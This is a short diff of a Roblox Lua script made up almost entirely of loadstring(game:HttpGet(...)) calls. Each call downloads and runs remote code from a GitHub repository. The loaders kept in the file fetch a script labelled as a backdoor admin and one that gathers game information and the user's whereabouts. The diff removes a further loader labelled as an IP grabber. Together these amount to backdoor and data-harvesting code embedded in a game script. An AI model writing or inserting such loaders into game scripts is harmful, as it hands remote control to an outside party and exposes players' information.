@@ -1,10 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/Backdoor",true))() -- BasicalBackdoorAdmin
-wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/IuniversalPscript",true))() -- BasicalIP
-
-wait(1)
-
-
 wait()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/Not",true))() -- BasicalInfoAbtGameAndWheresUser
 wait()
